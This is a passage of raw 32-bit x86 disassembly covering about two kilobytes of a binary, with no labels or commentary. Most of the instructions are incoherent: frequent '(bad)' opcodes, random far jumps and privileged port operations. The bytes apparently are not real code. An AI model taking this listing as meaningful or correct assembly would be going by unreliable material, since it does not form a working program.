  4125d4:	sbb    DWORD PTR [edi+0x52],ebx
  4125d7:	cmp    ch,dl
  4125d9:	inc    ecx
  4125da:	xchg   esp,eax
  4125db:	mov    esp,0xcf74f9df
  4125e0:	jge    0x412609
  4125e2:	sub    DWORD PTR [eax+0x4b5215a1],0xba30c61
  4125ec:	(bad)  
  4125ed:	(bad)  
  4125ee:	push   ecx
  4125ef:	inc    ebp
  4125f0:	inc    ecx
  4125f1:	and    ah,bl
  4125f3:	int    0xf
  4125f5:	js     0x4125e1
  4125f7:	push   cs
  4125f8:	mov    ds:0xa221dd73,eax
  4125fd:	xchg   esi,eax
  4125fe:	jb     0x412586
  412600:	dec    ebp
  412601:	pop    ebx
  412602:	mov    BYTE PTR [ebx-0x1a2db5d5],ch
  412608:	push   0x2e
  41260a:	int3   
  41260b:	mov    edx,0x8b35175c
  412610:	fcomp  QWORD PTR [esi+edi*1]
  412613:	pushf  
  412614:	adc    bl,cl
  412616:	out    dx,al
  412617:	or     DWORD PTR [ecx+0x31],esp
  41261a:	cmp    DWORD PTR [ecx-0x56],esp
  41261d:	push   ds
  41261e:	nop
  41261f:	jb     0x4125ab
  412621:	pop    esi
  412622:	push   esi
  412623:	adc    edi,DWORD PTR [eax+0x499f56cf]
  412629:	test   DWORD PTR [ebx+edx*4-0x3db76da3],esp
  412630:	aas    
  412631:	add    cl,BYTE PTR [eax]
  412633:	pop    es
  412634:	or     al,0xa0
  412636:	(bad)  
  412637:	stos   DWORD PTR es:[edi],eax
  412638:	(bad)  
  412639:	test   DWORD PTR [edi+esi*8-0x1c],esp
  41263d:	mov    al,ds:0x237a856a
  412642:	jecxz  0x4125ec
  412644:	pop    esp
  412645:	lea    esp,ds:0x45ef53ad
  41264b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41264c:	jecxz  0x412636
  41264e:	sub    eax,0x3519aa
  412653:	mov    ah,BYTE PTR [edx-0x5b5f3a3]
  412659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41265a:	adc    dh,BYTE PTR ds:0x5ee758e3
  412660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412661:	gs ja  0x4126a9
  412664:	add    al,0xc5
  412666:	jg     0x4125f5
  412668:	pusha  
  412669:	imul   edi,DWORD PTR [eax],0xff9f076e
  41266f:	dec    eax
  412670:	fwait
  412671:	imul   ebx,DWORD PTR [ebx],0xffffffe6
  412674:	outs   dx,DWORD PTR ds:[esi]
  412675:	inc    ecx
  412676:	in     al,dx
  412677:	add    ebx,DWORD PTR [ebx+0x258f7b42]
  41267d:	lock push esi
  41267f:	sub    bh,BYTE PTR [ebp-0x29]
  412682:	xor    eax,0x13d0e7bc
  412687:	jne    0x41262f
  412689:	and    ebx,esp
  41268b:	idiv   DWORD PTR [ebp+0x5b0ee8b8]
  412691:	fidivr DWORD PTR [edx]
  412693:	popf   
  412694:	cli    
  412695:	jp     0x412654
  412697:	push   cs
  412698:	sub    BYTE PTR [ebp+esi*4-0x65dec790],ah
  41269f:	or     eax,0xced6171f
  4126a4:	fstp   DWORD PTR ds:0xb70afd8f
  4126aa:	dec    esp
  4126ab:	xor    eax,DWORD PTR [ecx]
  4126ad:	push   es
  4126ae:	push   cs
  4126af:	es cli 
  4126b1:	and    DWORD PTR [ebx+0x3e6f3721],edx
  4126b7:	and    bh,BYTE PTR [ebp-0x5558dcef]
  4126bd:	push   eax
  4126be:	jns    0x412728
  4126c0:	sbb    ecx,DWORD PTR [ebx-0x7f765e4f]
  4126c6:	lock mov esi,0xa19c8b2e
  4126cc:	loopne 0x41271f
  4126ce:	xor    DWORD PTR [esi-0x12],ebp
  4126d1:	dec    ecx
  4126d2:	dec    ebx
  4126d3:	push   esi
  4126d4:	test   eax,0x9b56e18a
  4126d9:	dec    esi
  4126da:	jne    0x412722
  4126dc:	cmp    esp,DWORD PTR [ecx+0x25]
  4126df:	push   0x8c030b2a
  4126e4:	xor    cl,BYTE PTR [esi]
  4126e6:	(bad)  
  4126e7:	mov    ds:0xf1dbed42,al
  4126ec:	cmp    DWORD PTR [eax-0x109da254],edx
  4126f2:	and    al,0xf
  4126f4:	inc    esi
  4126f5:	mov    dh,0xe3
  4126f7:	outs   dx,BYTE PTR ds:[esi]
  4126f8:	cmp    eax,0xf1380890
  4126fd:	and    DWORD PTR [esi-0x22],edi
  412700:	test   al,dl
  412702:	mov    dh,0x6
  412704:	adc    DWORD PTR [ecx],edi
  412706:	mov    ah,0x55
  412708:	dec    esp
  412709:	daa    
  41270a:	mov    bx,ax
  41270d:	sbb    eax,0xeb5aedac
  412712:	inc    esp
  412713:	fs xchg ebp,eax
  412715:	or     BYTE PTR [edi],dh
  412717:	outs   dx,BYTE PTR ds:[esi]
  412718:	stc    
  412719:	jns    0x41269b
  41271b:	xlat   BYTE PTR ds:[ebx]
  41271c:	adc    eax,0x4562a233
  412721:	mov    ds,ecx
  412723:	stos   DWORD PTR es:[edi],eax
  412724:	sbb    DWORD PTR [esi+0x3],esp
  412727:	test   al,0xf4
  412729:	mov    al,ds:0xc8979dd5
  41272e:	mov    edi,DWORD PTR [edx]
  412730:	mov    cl,BYTE PTR [esi]
  412732:	push   esp
  412733:	call   0x4fcc:0x96927e7c
  41273a:	ins    BYTE PTR es:[edi],dx
  41273b:	pushf  
  41273c:	imul   ecx,DWORD PTR [edx+0x8],0xfffffff0
  412740:	dec    edx
  412741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412742:	mov    bl,0xdb
  412744:	push   ebx
  412745:	dec    esp
  412746:	fcom   DWORD PTR [ebx+0x51c8f930]
  41274c:	and    eax,0x538213a8
  412751:	(bad)  
  412752:	jae    0x41275a
  412754:	(bad)  
  412755:	cld    
  412756:	xchg   esi,eax
  412757:	jmp    0xb454e99d
  41275c:	mov    dh,bh
  41275e:	jmp    0x2e18:0x72ef30ca
  412765:	and    bl,dl
  412767:	dec    esp
  412768:	xchg   esp,eax
  412769:	iret   
  41276a:	cmp    al,0x3
  41276c:	scas   al,BYTE PTR es:[edi]
  41276d:	sub    eax,0xd67ff2b7
  412772:	js     0x4127ee
  412774:	xchg   ecx,eax
  412775:	or     eax,0x52305f52
  41277a:	shr    dh,0x38
  41277d:	xchg   ecx,eax
  41277e:	call   0xa19a70f8
  412783:	div    BYTE PTR [ebx-0x9]
  412786:	daa    
  412787:	mov    dh,0xee
  412789:	sbb    edx,esp
  41278b:	lods   al,BYTE PTR ds:[esi]
  41278c:	popf   
  41278d:	retf   0x46aa
  412790:	(bad)
  412794:	mov    BYTE PTR [ebx+0x60a018ae],dh
  41279a:	ss sub dh,0xf
  41279e:	pop    eax
  41279f:	inc    edx
  4127a0:	test   BYTE PTR [edi-0x40e0f606],al
  4127a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127a7:	jns    0x412778
  4127a9:	xlat   BYTE PTR ds:[ebx]
  4127aa:	(bad)  
  4127ab:	fild   WORD PTR [ecx-0x5a]
  4127ae:	jns    0x412758
  4127b0:	xor    al,0xcf
  4127b2:	fsincos 
  4127b4:	out    dx,eax
  4127b5:	call   edx
  4127b7:	xchg   ebp,eax
  4127b8:	cmc    
  4127b9:	pop    ebp
  4127ba:	jg     0x412801
  4127bc:	xchg   DWORD PTR [ecx-0x5e],ebp
  4127bf:	xor    eax,DWORD PTR ds:0xe9f943c0
  4127c5:	aad    0x15
  4127c7:	dec    esi
  4127c8:	dec    eax
  4127c9:	cmp    BYTE PTR [esi+0x7a90043b],dh
  4127cf:	jnp    0x4127a9
  4127d1:	fnstenv [esi-0x3312b95a]
  4127d7:	push   edx
  4127d8:	fcom   QWORD PTR [ebx+0x44]
  4127db:	lods   eax,DWORD PTR ds:[esi]
  4127dc:	push   esi
  4127dd:	iret   
  4127de:	aam    0xdb
  4127e0:	pushf  
  4127e1:	outs   dx,DWORD PTR ds:[esi]
  4127e2:	icebp  
  4127e3:	mov    cl,BYTE PTR [ebp+0x7e]
  4127e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127e8:	clc    
  4127e9:	mov    cl,0xbd
  4127eb:	mov    es,WORD PTR [esi]
  4127ed:	sub    ebx,edx
  4127ef:	ret    
  4127f0:	pusha  
  4127f1:	jae    0x4127f7
  4127f3:	pop    edi
  4127f4:	aas    
  4127f5:	add    edi,ebp
  4127f7:	pusha  
  4127f8:	mov    dh,0xc4
  4127fa:	sbb    ah,bh
  4127fc:	cmp    BYTE PTR [eax-0x516d6b9d],bl
  412802:	jle    0x412788
  412804:	xor    al,0x22
  412806:	lods   al,BYTE PTR ds:[esi]
  412807:	jmp    DWORD PTR [edx-0x57]
  41280a:	lods   eax,DWORD PTR ds:[esi]
  41280b:	retf   
  41280c:	mov    ecx,0x7fd41d69
  412811:	pop    ss
  412812:	jge    0x412844
  412814:	cmp    eax,0x81540065
  412819:	fwait
  41281a:	rol    DWORD PTR fs:[ebx+0x58],0x3e
  41281f:	jne    0x412861
  412821:	jo     0x4127b5
  412823:	mov    al,ds:0xacabb0f7
  412828:	pop    ebp
  412829:	dec    esp
  41282a:	(bad)  
  41282b:	ror    DWORD PTR [edi+0x3c],1
  41282e:	ss dec ebp
  412830:	sbb    eax,0x9902789a
  412835:	dec    ecx
  412836:	loop   0x4128b3
  412838:	push   ds
  412839:	xor    eax,0x9ba412a1
  41283e:	dec    ebx
  41283f:	ret    0x5651
  412842:	cmp    BYTE PTR [ecx+0x62],bh
  412845:	mov    edx,0x7e94d93b
  41284a:	push   ebx
  41284b:	inc    edx
  41284c:	sti    
  41284d:	icebp  
  41284e:	jb     0x4127d6
  412850:	add    ah,BYTE PTR [eax+0x66]
  412853:	into   
  412854:	int3   
  412855:	add    DWORD PTR ds:0x9622666a,eax
  41285b:	jnp    0x41280e
  41285d:	mov    ds:0x4589294e,al
  412862:	push   eax
  412863:	int    0xd
  412865:	sbb    BYTE PTR [ebp-0x5c265cab],al
  41286b:	dec    ecx
  41286c:	loopne 0x4128b6
  41286e:	push   ds
  41286f:	jo     0x412839
  412871:	xor    BYTE PTR [edi-0x7ac1726f],0x16
  412878:	leave  
  412879:	daa    
  41287a:	jo     0x412889
  41287c:	retf   0x6877
  41287f:	jle    0x412893
  412881:	(bad)  
  412882:	shl    DWORD PTR [eax+0x557d12d0],1
  412888:	retf   
  412889:	jmp    0x583ed0a3
  41288e:	rol    DWORD PTR [esp+esi*8+0x72],0x6e
  412893:	loopne 0x412829
  412895:	inc    eax
  412896:	push   cs
  412897:	fld    DWORD PTR ds:0x3b486611
  41289d:	ret    
  41289e:	loopne 0x4128ba
  4128a0:	xlat   BYTE PTR ds:[ebx]
  4128a1:	adc    dl,ch
  4128a3:	dec    esp
  4128a4:	jne    0x412917
  4128a6:	cmp    DWORD PTR [ecx+0x4],ecx
  4128a9:	inc    ecx
  4128aa:	(bad)  
  4128ab:	stos   DWORD PTR es:[edi],eax
  4128ac:	jmp    0xfd3d:0x701ea55c
  4128b3:	aam    0xda
  4128b5:	lahf   
  4128b6:	ins    BYTE PTR es:[edi],dx
  4128b7:	inc    eax
  4128b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128b9:	cmp    al,0x4f
  4128bb:	ds shl esp,1
  4128be:	pop    edx
  4128bf:	idiv   DWORD PTR fs:[ecx-0x51]
  4128c3:	loop   0x41289e
  4128c5:	jno    0x41288a
  4128c7:	fwait
  4128c8:	mov    eax,ds:0x2dd19c39
  4128cd:	aas    
  4128ce:	addr16 in eax,0xa5
  4128d1:	cmp    al,0xa5
  4128d3:	add    DWORD PTR [edx-0x8],eax
  4128d6:	hlt    
  4128d7:	inc    ecx
  4128d8:	ffree  st(5)
  4128da:	sbb    dh,BYTE PTR [eax]
  4128dc:	gs dec esp
  4128de:	sahf   
  4128df:	lods   al,BYTE PTR ds:[esi]
  4128e0:	sar    bl,cl
  4128e2:	or     DWORD PTR [eax],esp
  4128e4:	gs gs xchg ebp,eax
  4128e7:	or     BYTE PTR [eax],bl
  4128e9:	inc    ebx
  4128ea:	std    
  4128eb:	jne    0x412965
  4128ed:	fmul   DWORD PTR [ecx+0x67]
  4128f0:	push   ds
  4128f1:	pushf  
  4128f2:	cwde   
  4128f3:	mov    dl,0x92
  4128f5:	adc    esi,esp
  4128f7:	push   eax
  4128f8:	(bad)  
  4128f9:	sbb    ebp,DWORD PTR [ecx]
  4128fb:	cmp    al,0x6a
  4128fd:	push   ecx
  4128fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ff:	dec    edx
  412900:	test   BYTE PTR [eax-0x24],bl
  412903:	push   cs
  412904:	std    
  412905:	stc    
  412906:	or     ecx,DWORD PTR [ebx]
  412908:	add    eax,0xb3564489
  41290d:	pop    es
  41290e:	jo     0x412906
  412910:	and    BYTE PTR [ecx],0xd1
  412913:	lahf   
  412914:	ret    
  412915:	or     esp,edx
  412917:	adc    edi,DWORD PTR ds:[edx+0x56984f88]
  41291e:	movnti DWORD PTR [edi-0x59],esp
  412922:	inc    eax
  412923:	push   ebx
  412924:	or     BYTE PTR [ebp-0x80],bl
  412927:	mov    cl,0x6
  412929:	jle    0x4128c5
  41292b:	jne    0x412954
  41292d:	mov    BYTE PTR [edx+0x1483522e],dl
  412933:	mov    ecx,0x373f6ba5
  412938:	mov    ds:0xd890057d,al
  41293d:	sahf   
  41293e:	cwde   
  41293f:	mov    esi,0x5e82c6f1
  412944:	sbb    ah,bh
  412946:	jmp    0x3385fe02
  41294b:	ins    DWORD PTR es:[edi],dx
  41294c:	ja     0x41292d
  41294e:	repnz lea eax,[eax+0x44]
  412952:	gs jmp 0x41296b
  412955:	mov    bh,0x82
  412957:	adc    DWORD PTR [edi-0x6e],ecx
  41295a:	mov    bh,0x46
  41295c:	push   esp
  41295d:	sti    
  41295e:	adc    DWORD PTR [ecx-0x41],esi
  412961:	pop    es
  412962:	mov    ah,0xac
  412964:	and    bl,bh
  412966:	and    edi,DWORD PTR [ebx]
  412968:	sar    ebp,1
  41296a:	daa    
  41296b:	fldenv [eax+0x2283bb47]
  412971:	mov    ebx,0x83f45d98
  412976:	mov    ah,0x28
  412978:	mov    eax,ds:0x626f5d63
  41297d:	sub    BYTE PTR [edx+0x39],ah
  412980:	mov    ebx,0xea6c1be
  412985:	lods   eax,DWORD PTR ds:[esi]
  412986:	adc    eax,0x39d75097
  41298b:	push   ecx
  41298c:	push   edi
  41298d:	pop    ebp
  41298e:	pop    edi
  41298f:	repz mov al,0xd
  412992:	inc    esp
  412993:	pusha  
  412994:	mov    esp,0x5dcdb8cb
  412999:	add    edx,DWORD PTR [eax]
  41299b:	rol    BYTE PTR [ebx-0x6c],0x6a
  41299f:	retf   
  4129a0:	jb     0x4129f2
  4129a2:	(bad)  
  4129a4:	nop
  4129a5:	pop    edx
  4129a6:	call   0x784:0x55dd23c3
  4129ad:	jl     0x412972
  4129af:	add    al,0x99
  4129b1:	and    ch,bh
  4129b3:	adc    cl,BYTE PTR [esi]
  4129b5:	stc    
  4129b6:	aad    0x4c
  4129b8:	adc    eax,0x9136306f
  4129bd:	jmp    0x23bb:0x16cf174a
  4129c4:	push   ecx
  4129c5:	pusha  
  4129c6:	cwde   
  4129c7:	push   ss
  4129c8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ca:	adc    ebp,DWORD PTR [edx-0x2d]
  4129cd:	and    eax,DWORD PTR [edi-0x10]
  4129d0:	mov    ah,0x33
  4129d2:	rol    ebp,cl
  4129d4:	adc    eax,0xa0ae41a1
  4129d9:	xchg   ch,dl
  4129db:	mov    WORD PTR [edx+0x59ba5a15],es
  4129e1:	sub    BYTE PTR [ebx],ah
  4129e3:	int3   
  4129e4:	fidiv  WORD PTR [esi]
  4129e6:	lock xor edi,ecx
  4129e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ea:	pop    es
  4129eb:	dec    edi
  4129ec:	or     al,0xe5
  4129ee:	jmp    0x27a:0xf549169c
  4129f5:	push   esi
  4129f6:	pop    esp
  4129f7:	or     al,0xa3
  4129f9:	pop    eax
  4129fa:	nop
  4129fb:	push   cs
  4129fc:	jl     0x412a22
  4129fe:	pop    eax
  4129ff:	mov    esi,0x7e90c7db
  412a04:	popf   
  412a05:	jg     0x4129b4
  412a07:	fist   WORD PTR [esi+0x16]
  412a0a:	ins    BYTE PTR es:[edi],dx
  412a0b:	xchg   edi,eax
  412a0c:	mov    DWORD PTR [esi],ebp
  412a0e:	pop    ecx
  412a0f:	jle    0x4129a6
  412a11:	stc    
  412a12:	add    bh,ah
  412a14:	pop    esp
  412a15:	dec    si
  412a17:	sbb    DWORD PTR ds:0x569963a7,esi
  412a1d:	pop    edi
  412a1e:	xor    esi,esi
  412a20:	inc    ecx
  412a21:	adc    al,0xa9
  412a23:	push   0xffffff90
  412a25:	sub    eax,0x36132947
  412a2a:	inc    eax
  412a2b:	out    0xae,al
  412a2d:	or     DWORD PTR [ebp+0x6f],ecx
  412a30:	pushf  
  412a31:	mov    bl,BYTE PTR [ebp+0x10ae20f0]
  412a37:	aam    0x1d
  412a39:	sahf   
  412a3a:	or     dh,BYTE PTR [ecx+0x1f]
  412a3d:	mov    edi,0xcb3a41d7
  412a42:	jno    0x4129db
  412a44:	adc    al,0x6c
  412a46:	das    
  412a47:	xchg   edx,eax
  412a48:	pop    ebp
  412a49:	mov    dh,0xbd
  412a4b:	sub    eax,0xc5ea276b
  412a50:	mov    cl,0x87
  412a52:	xor    edi,DWORD PTR [ebp+0xa]
  412a55:	(bad)  
  412a56:	rcr    BYTE PTR [ecx+0x6c],cl
  412a59:	sub    DWORD PTR [ecx],edx
  412a5b:	out    dx,al
  412a5c:	sub    bl,dh
  412a5e:	xchg   ebp,eax
  412a5f:	stos   BYTE PTR es:[edi],al
  412a60:	out    dx,al
  412a61:	pop    edx
  412a62:	push   ds
  412a63:	adc    al,BYTE PTR [eax+0xe]
  412a66:	(bad)  
  412a67:	mov    ecx,0xe89d496b
  412a6c:	and    BYTE PTR [eax-0x2a],ah
  412a6f:	rol    BYTE PTR [esp+edx*2-0x18],1
  412a73:	lea    ebx,[edi]
  412a75:	sar    al,cl
  412a77:	ror    DWORD PTR [ecx+ebx*4+0x4114a76b],cl
  412a7e:	(bad)  
  412a7f:	or     ax,0xad76
  412a83:	xchg   BYTE PTR [edx],bh
  412a85:	in     eax,dx
  412a86:	jns    0x412afc
  412a88:	stos   DWORD PTR es:[edi],eax
  412a89:	out    dx,al
  412a8a:	xchg   ebx,eax
  412a8b:	retf   
  412a8c:	pop    edx
  412a8d:	inc    esi
  412a8e:	xor    ah,BYTE PTR [esi+0x1be4aaa4]
  412a94:	out    0xae,al
  412a96:	mov    esi,0x3204883e
  412a9b:	dec    esi
  412a9c:	mov    edi,0x63280736
  412aa1:	fmul   st,st(4)
  412aa3:	xchg   BYTE PTR [esi+0x5],cl
  412aa6:	push   edx
  412aa7:	(bad)  
  412aa8:	aaa    
  412aa9:	add    al,0x89
  412aab:	sub    edx,edi
  412aad:	adc    DWORD PTR [ebp+0x3a044e63],esi
  412ab3:	push   cs
  412ab4:	xchg   esp,eax
  412ab5:	ins    BYTE PTR es:[edi],dx
  412ab6:	pop    edx
  412ab7:	push   ebx
  412ab8:	mov    cs,WORD PTR [ebx]
  412aba:	jge    0x412b1c
  412abc:	cmp    DWORD PTR [eax],eax
  412abe:	std    
  412abf:	jno    0x412aca
  412ac1:	adc    al,0xa5
  412ac3:	inc    edx
  412ac4:	xor    ch,ch
  412ac6:	xchg   esp,eax
  412ac7:	loope  0x412ab7
  412ac9:	sbb    ebx,DWORD PTR [edi-0x4d]
  412acc:	lea    edx,[edi-0x4b]
  412acf:	xor    cl,BYTE PTR [edi]
  412ad1:	or     bh,BYTE PTR [esi+0x3b18264a]
  412ad7:	cmc    
  412ad8:	sub    BYTE PTR ds:0x37e8d1c7,0xa2
  412adf:	sbb    al,0x92
  412ae1:	imul   edi,DWORD PTR [edi+0x791791b4],0x36
  412ae8:	adc    BYTE PTR [edx],al
  412aea:	sub    ebp,DWORD PTR [ecx-0x63]
  412aed:	jl     0x412b5b
  412aef:	push   ebp
  412af0:	nop
  412af1:	push   ss
  412af2:	mov    edi,0x3736fe4a
  412af7:	sbb    al,0xeb
  412af9:	cmp    edi,esp
  412afb:	pop    ds
  412afc:	mov    DWORD PTR [edx],edx
  412afe:	aad    0x53
  412b00:	sbb    eax,0xa0b3fa1
  412b05:	mov    esp,DWORD PTR [esi-0x51cf14e3]
  412b0b:	pop    ebx
  412b0c:	stos   BYTE PTR es:[edi],al
  412b0d:	(bad)  
  412b0e:	or     BYTE PTR [eax+0x37],dh
  412b11:	lahf   
  412b12:	cmp    bh,0xd8
  412b15:	int3   
  412b16:	xchg   esi,eax
  412b17:	hlt    
  412b18:	jae    0x412b5c
  412b1a:	jmp    0xfc13:0x6801ac5d
  412b21:	fld    st(0)
  412b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b24:	rol    BYTE PTR [edi+ebx*1+0x696d5232],cl
  412b2b:	mul    DWORD PTR [ecx]
  412b2d:	xor    ah,BYTE PTR [ecx+0x33a550d3]
  412b33:	fidivr DWORD PTR fs:[ebx-0x61]
  412b37:	in     eax,dx
  412b38:	push   ds
  412b39:	inc    eax
  412b3a:	(bad)  
  412b3b:	fimul  DWORD PTR [ebp+0x44f2c320]
  412b41:	not    BYTE PTR [ebp+0x18]
  412b44:	cwde   
  412b45:	and    BYTE PTR [ebx+0x5d176c7c],ch
  412b4b:	mov    cl,0x7f
  412b4d:	jmp    0x412b9f
  412b4f:	inc    eax
  412b50:	aam    0xda
  412b52:	dec    esi
  412b53:	js     0x412b2a
  412b55:	xor    al,0x28
  412b57:	and    ecx,esp
  412b59:	xchg   esi,eax
  412b5a:	aaa    
  412b5b:	retf   0x754f
  412b5e:	jmp    0xc7b3235b
  412b63:	pop    ebp
  412b64:	ret    0xd1fa
  412b67:	aas    
  412b68:	dec    esp
  412b69:	inc    ecx
  412b6a:	in     al,0x37
  412b6c:	mov    ch,BYTE PTR [eax+0x6b2055a4]
  412b72:	xchg   edi,eax
  412b73:	pop    ebp
  412b74:	mov    ds:0xf1cead55,eax
  412b79:	loope  0x412b28
  412b7b:	jge    0x412b5f
  412b7d:	aas    
  412b7e:	aaa    
  412b7f:	add    eax,DWORD PTR [esi]
  412b81:	pop    ss
  412b82:	jge    0x412b30
  412b84:	push   ebp
  412b85:	je     0x412c02
  412b87:	sub    eax,0xffffff85
  412b8a:	test   ebx,ebx
  412b8c:	sbb    BYTE PTR [edi+0x2c],0x7a
  412b90:	clc    
  412b91:	xchg   esi,eax
  412b92:	popa   
  412b93:	fdivr  st,st(3)
  412b95:	test   DWORD PTR [ecx-0x2a],ebp
  412b98:	aas    
  412b99:	push   cs
  412b9a:	pop    ss
  412b9b:	sbb    edi,DWORD PTR [edx-0x6a]
  412b9e:	mov    ch,0xa3
  412ba0:	xor    ah,cl
  412ba2:	mov    DWORD PTR [edi-0x34],eax
  412ba5:	xchg   ebx,eax
  412ba6:	adc    ecx,DWORD PTR [eax]
  412ba8:	add    BYTE PTR [edi],bl
  412baa:	stc    
  412bab:	icebp  
  412bac:	xor    BYTE PTR [ecx+0x79],dl
  412baf:	xchg   esp,eax
  412bb0:	ins    BYTE PTR es:[edi],dx
  412bb1:	sub    eax,0x335d2214
  412bb6:	sub    eax,0x7bfe49c5
  412bbb:	cwde   
  412bbc:	fidivr DWORD PTR [edx+eiz*1+0x4baf5f54]
  412bc3:	in     al,dx
  412bc4:	add    eax,0x9a9e8922
  412bc9:	das    
  412bca:	(bad)  
  412bcc:	stos   DWORD PTR es:[edi],eax
  412bcd:	int    0x44
  412bcf:	mov    eax,edi
  412bd1:	jmp    0x412c09
  412bd3:	push   ss
  412bd4:	mov    ch,0xbd
  412bd6:	icebp  
  412bd7:	cs addr16 jge 0x412c30
  412bdb:	mov    ebp,0x53c0db51
  412be0:	sar    edi,0xe4
  412be3:	and    al,0xc4
  412be5:	gs scas eax,DWORD PTR es:[edi]
  412be7:	sbb    eax,DWORD PTR [ecx]
  412be9:	mov    al,ds:0x8cea6ebc
  412bee:	arpl   WORD PTR [edx+0x27],dx
  412bf1:	enter  0xa08b,0x1d
  412bf5:	pop    ss
  412bf6:	(bad)  
  412bf8:	shl    BYTE PTR [ecx-0x28d80368],0x62
  412bff:	ja     0x412c69
  412c01:	rcr    DWORD PTR [eax],0x1c
  412c04:	stc    
  412c05:	mov    ?,ebp
  412c07:	test   eax,0xa5a8fb9
  412c0c:	imul   ecx,DWORD PTR [ecx],0x5d
  412c0f:	cmp    ebp,ebp
  412c11:	out    0x9b,eax
  412c13:	adc    al,cl
  412c15:	xchg   DWORD PTR [esi+esi*8],ebx
  412c18:	(bad)  
  412c19:	cmp    DWORD PTR [ebp+0x3159037a],0x2d
  412c20:	call   0x6a00:0x525e26d9
  412c27:	sahf   
  412c28:	pop    ecx
  412c29:	adc    eax,0x20d95da8
  412c2e:	call   0x593f:0xa29297c
  412c35:	ja     0x412bc9
  412c37:	sub    eax,0xbefbefcc
  412c3c:	xchg   ebx,eax
  412c3d:	push   ebx
  412c3e:	mov    al,0xda
  412c40:	dec    esp
  412c41:	mov    ds:0x3c5882c3,al
  412c46:	daa    
  412c47:	loopne 0x412c9b
  412c49:	sub    BYTE PTR [edi-0x32],0x92
  412c4d:	out    0xb3,eax
  412c4f:	pop    esi
  412c50:	pop    edi
  412c51:	lahf   
  412c52:	and    BYTE PTR [eax+0x9],al
  412c55:	or     al,BYTE PTR [edi+0x2d]
  412c58:	sahf   
  412c59:	mov    bh,0x95
  412c5b:	bound  edx,QWORD PTR [eax]
  412c5d:	cli    
  412c5e:	add    BYTE PTR [ecx+0x60],ch
  412c61:	add    ch,BYTE PTR [edx+0x6f]
  412c64:	jae    0x412bf6
  412c66:	cmp    al,0x7f
  412c68:	pop    esp
  412c69:	cmp    eax,0x6dd13f1
  412c6e:	xchg   ecx,eax
  412c6f:	mov    bl,bh
  412c71:	inc    eax
  412c72:	xchg   ecx,eax
  412c73:	mov    dh,0xd4
  412c75:	and    ebx,DWORD PTR [ebx]
  412c77:	xor    eax,0x8e289fd3
  412c7c:	addr16 popf 
  412c7e:	or     eax,0xfbf63781
  412c83:	mov    ch,0xab
  412c85:	xor    BYTE PTR ds:0xbca19342,ah
  412c8b:	or     eax,0xc179cbdd
  412c90:	cld    
  412c91:	xchg   edi,eax
  412c92:	ret    
  412c93:	mov    ecx,0xeacce0ca
  412c98:	and    al,0x72
  412c9a:	add    edi,DWORD PTR [edx+0xab392b0]
  412ca0:	(bad)  
  412ca2:	pusha  
  412ca3:	add    ah,dl
  412ca5:	test   ebx,0xbe5d2934
  412cab:	es in  al,0x8d
  412cae:	out    dx,eax
  412caf:	xchg   esp,eax
  412cb0:	xchg   ebx,eax
  412cb1:	ja     0x412cf1
  412cb3:	jl     0x412c65
  412cb5:	cmp    eax,0x700422f6
  412cba:	or     BYTE PTR [edx+0x58],al
  412cbd:	jns    0x412cbb
  412cbf:	les    ebp,FWORD PTR ds:0x871b1ab4
  412cc5:	int    0x9b
  412cc7:	bswap  ebp
  412cc9:	adc    ah,BYTE PTR [esi+0x6b10e69]
  412ccf:	and    DWORD PTR [edx+0x2e2e38ab],eax
  412cd5:	pusha  
  412cd6:	sub    eax,0x506ba3fb
  412cdb:	repnz mov eax,0x51c0ba08
  412ce1:	arpl   si,sp
  412ce3:	jp     0x412cd2
  412ce5:	jmp    0x6e6edf58
  412cea:	pop    es
  412ceb:	mov    edi,0xa334a7db
  412cf0:	or     eax,DWORD PTR [edx]
  412cf2:	mov    esp,0xd15e1293
  412cf7:	mov    ds:0x7fbdcde2,eax
  412cfc:	push   ecx
  412cfd:	xchg   ebp,eax
  412cfe:	mov    ecx,0xe3aa69
  412d03:	sbb    edx,DWORD PTR [ebp+0x2f]
  412d06:	fistp  QWORD PTR [eax-0x14]
  412d09:	and    DWORD PTR [ebx],ebx
  412d0b:	xchg   ebp,eax
  412d0c:	mov    ds:0xa939935a,eax
  412d11:	pusha  
  412d12:	pop    ss
  412d13:	mov    cl,0x2e
  412d15:	and    eax,0xcb1c5c0c
  412d1a:	mov    ebp,0xda6f6fc0
  412d1f:	push   esp
  412d20:	aam    0x5f
  412d22:	pop    ebp
  412d23:	int    0x16
  412d25:	pop    ebp
  412d26:	mov    edx,edi
  412d28:	dec    ebp
  412d29:	fidivr DWORD PTR [edi-0x6d3d7ee6]
  412d2f:	and    BYTE PTR [esi-0x31477b9c],al
  412d35:	leave  
  412d36:	shl    ebx,1
  412d38:	pop    ds
  412d39:	pop    ebp
  412d3a:	fstp   QWORD PTR [esp+esi*2]
  412d3d:	add    eax,0xc3333857
  412d42:	repnz add eax,0xdb880031
  412d48:	push   ebp
  412d49:	sub    al,0xf5
  412d4b:	mov    al,ds:0xafc6a8af
  412d50:	clc    
  412d51:	inc    edi
  412d52:	mov    WORD PTR [ecx+eiz*2+0x7395e559],cs
  412d59:	jne    0x412d5c
  412d5b:	dec    eax
  412d5c:	push   edx
  412d5d:	leave  
  412d5e:	jmp    0x412d8a
  412d60:	and    eax,0xd172290e
  412d65:	mov    ds:0xbe549d6a,eax
  412d6a:	xchg   BYTE PTR ds:0xf309951d,bh
  412d70:	mov    db0,ebx
  412d73:	and    bl,BYTE PTR [edi+0x50f52118]
  412d79:	add    ecx,ecx
  412d7b:	sti    
  412d7c:	pop    es
  412d7d:	retf   
  412d7e:	outs   dx,DWORD PTR ds:[esi]
  412d7f:	xchg   DWORD PTR [esi+0x35b0b22d],ebp
  412d85:	sub    BYTE PTR [ebx],dh
  412d87:	cmp    al,0xe1
